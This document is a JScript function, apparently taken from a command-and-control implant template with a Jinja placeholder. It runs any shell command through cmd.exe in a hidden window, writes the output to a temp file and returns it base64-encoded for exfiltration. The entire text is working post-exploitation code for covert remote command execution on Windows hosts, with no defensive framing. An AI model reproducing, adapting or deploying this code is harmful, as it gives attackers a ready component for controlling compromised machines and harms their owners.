function cmd(command) {
  tmp = wscriptshell.ExpandEnvironmentStrings("%TEMP%");
  stdout_path = tmp + '\\{{ command_stdout }}.txt';
  fs = new ActiveXObject("Scripting.FileSystemObject");
  compsec = wscriptshell.ExpandEnvironmentStrings("%COMSPEC%");
  command = compsec + ' /c ' + command + ' 1> ' + stdout_path + ' 2>&1';
  results = '';
  try {
    file_exists_message = '';
    if (fs.FileExists(stdout_path)) {
      file_exists_message = '\n[!] ' + stdout_path + ' stdout file already exists, this may cause issues.\n';
    }
    wscriptshell.Run(command, 0, true);
    fd = fs.OpenTextFile(stdout_path)
    results = results + fd.ReadAll();
    fd.close();
    //delfile(stdout_path);
    if (fs.FileExists(stdout_path)) {
      file_exists_message = file_exists_message + '[!] Failed to remove stdout file: ' + stdout_path + '\n';
    }
    results = file_exists_message + '\n' + results;
    return b64e(results);
  } catch (e) {
    file_exists_message = '';
    if (fs.FileExists(stdout_path)) {
      file_exists_message = '\n[!] Failed to remove stdout file: ' + stdout_path + '\n';
    }
    results = file_exists_message + '[!] Failed to run command: ' + e.message + '\n\n' + results;
    return b64e(results);
  }
}